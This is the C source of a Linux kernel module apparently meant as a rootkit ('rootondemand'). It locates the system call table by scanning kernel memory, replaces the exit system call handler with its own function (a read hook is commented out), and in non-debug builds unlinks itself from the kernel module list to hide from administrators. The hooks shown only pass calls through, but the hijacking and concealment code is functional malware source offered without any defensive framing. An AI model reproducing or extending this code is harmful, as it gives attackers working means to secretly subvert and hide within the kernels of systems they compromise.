#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/config.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/syscalls.h>
#include <linux/errno.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>

#define DEBUG
#define INCREASE_PTR(ptr,x) ptr=(int *)(((int)ptr)+x)
#define SYSCALLS_GAP(x,y) (x-y)*4
#define RETURN(ret) __asm("leave\nret\n"::"a"(ret));
#ifdef DEBUG
#  define debug_printk(...) printk(KERN_DEBUG __VA_ARGS__);
#  define DEBUG_PRINTK(...) debug_printk(__VA_ARGS__);
#else
#  define DEBUG_PRINTK(...)
#endif
#define PARASSITIZE(syc) { \
    DEBUG_PRINTK("ORIGINAL sys_%s: %p\n",#syc,sys_table[__NR_##syc]); \
    ptr_sys##syc=(void *)sys_table[__NR_##syc]; \
    sys_table[__NR_##syc]=(void *)parassite_##syc; \
    DEBUG_PRINTK("REPLACED sys_%s: %p %p\n",#syc,sys_table[__NR_##syc],parassite_##syc); \
}
#define PESTICIDE(syc) { \
    DEBUG_PRINTK("RESTORING sys_%s: %p\n",#syc,sys_table[__NR_##syc]); \
    sys_table[__NR_##syc]=(void *)ptr_sys##syc; \
    DEBUG_PRINTK("RESTORED sys_%s: %p %p\n",#syc,sys_table[__NR_##syc],ptr_sys##syc); \
}

static unsigned int **sys_table;
static asmlinkage ssize_t (*ptr_sysread)(int,char __user *,size_t);
static asmlinkage long (*ptr_sysexit)(int);
extern struct seq_operations modules_op;

static unsigned int **find_systable(void) {
  asmlinkage ssize_t (*ptr_sysread)(unsigned int,char __user *,size_t)=sys_read;
  asmlinkage long (*ptr_sysopen)(const char __user *,int,int)=sys_open;
  unsigned int *ptr;
#ifdef DEBUG
  int j;
  ptr=(int *)&init_mm.start_code;
  for (j=0;j<7;j++,INCREASE_PTR(ptr,4))
    DEBUG_PRINTK("PTR: 0x%x\n",*ptr);
#endif
  for (ptr=(int *)init_mm.end_code;((long)ptr)<init_mm.end_data;INCREASE_PTR(ptr,1)) {
    if (*ptr==(int)ptr_sysread) {
      INCREASE_PTR(ptr,SYSCALLS_GAP(__NR_open,__NR_read));
      if (*ptr==(int)ptr_sysopen) {
        DEBUG_PRINTK("FOUND =D: 0x%p sys_open: %p\n",ptr,(void *)*ptr);
        INCREASE_PTR(ptr,-(__NR_open*4));
        DEBUG_PRINTK("FOUND =D: 0x%p sys_restart_syscall: %p\n",ptr,(void *)*ptr);
        DEBUG_PRINTK("syscall_table at: 0x%p\n",ptr);
        return((unsigned int **)ptr);
      }
    }
  }
  DEBUG_PRINTK("NOPE =(\n");
  return((unsigned int **)NULL);
}

long parassite_exit(int x) {
  DEBUG_PRINTK("parassite_exit\n");
  return(ptr_sysexit(x));
}

void parassite_read(int fd,char __user *u_buf,size_t size) {
  ssize_t ret;
#ifndef CONFIG_REGPARM
  ret=ptr_sysread(fd,u_buf,size);
#else
  __asm__("subl $0xc,%%esp\n"
          "movl 0x8(%%ebp),%%eax\n"
          "movl %%eax,(%%esp)\n"
          "movl 0xc(%%ebp),%%eax\n"
          "movl %%eax,0x4(%%esp)\n"
          "movl 0x10(%%ebp),%%eax\n"
          "movl %%eax,0x8(%%esp)\n"
          "movl $3,%%eax\n"
          "call *%1\n"
          :"=a"(ret)
          :"r"(ptr_sysread)
  );
#endif
  RETURN(ret);
}

int rootondemand_init(void) {
#ifdef DEBUG
  /* Print prev and next modules in linked list */
  int *ptr=(int *)THIS_MODULE->list.prev;
  INCREASE_PTR(ptr,sizeof(struct list_head));
  DEBUG_PRINTK("%s\n",(ptr[0]==0) ? "NONE" : (char *)ptr);
  ptr=(int *)THIS_MODULE->list.next;
  INCREASE_PTR(ptr,sizeof(struct list_head));
  DEBUG_PRINTK("%s\n",(ptr[0]==0) ? "NONE" : (char *)ptr);
#endif
  /* Voluntary redundant */
#ifndef DEBUG
  /* Let's cloack from module list ;P */ 
  struct list_head *l_ptr=&THIS_MODULE->list;
  try_module_get(THIS_MODULE);
  l_ptr->next->prev=l_ptr->prev;
  l_ptr->prev->next=l_ptr->next;
  l_ptr->next=LIST_POISON1;
  l_ptr->prev=LIST_POISON2;
#endif
  sys_table=find_systable();
  if (!sys_table) return(-EFAULT);
  __asm("cli");
  PARASSITIZE(exit);
//  PARASSITIZE(read);
  __asm("sti");
  return(0);
}

void rootondemand_exit(void) {
  __asm("cli");
  PESTICIDE(exit);
//  PESTICIDE(read);
  __asm("sti");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Andrea Villa");

module_init(rootondemand_init);
module_exit(rootondemand_exit);
